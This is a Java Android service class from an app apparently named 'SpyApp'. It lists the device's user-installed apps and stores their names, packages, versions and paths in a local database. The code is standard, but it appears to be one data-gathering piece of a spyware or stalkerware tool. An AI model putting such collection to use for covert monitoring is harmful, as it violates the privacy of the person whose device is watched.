package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.InstallAppModel;

import java.util.ArrayList;
import java.util.List;


public class InstallAppListService extends IntentService {
    private SpyApp spyApp;

    public InstallAppListService() {
        super(InstallAppListService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "installApp");
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<InstallAppModel> installAppList = getInstalledApps(false);/* false = no system packages */
        if (installAppList != null && installAppList.size() > 0) {
            for (int i = 0; i < installAppList.size(); i++) {
                spyApp.getDatabaseHelper().insertApp(installAppList.get(i));
            }
        }
    }


    private ArrayList<InstallAppModel> getInstalledApps(boolean getSysPackages) {
        ArrayList<InstallAppModel> installAppList = new ArrayList<InstallAppModel>();
        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }
            InstallAppModel newInfo = new InstallAppModel();
            newInfo.setAppname(p.applicationInfo.loadLabel(getPackageManager()).toString());
            newInfo.setPackageName(p.packageName);
            newInfo.setVersionName(p.versionName);
            newInfo.setVersioncode(p.versionCode);
            newInfo.setSourceDirectory(p.applicationInfo.sourceDir);
            installAppList.add(newInfo);

           // Log.i("Debug", "getInstalledApps: AppName ="+newInfo.getAppname());
        }
        return installAppList;
    }
}
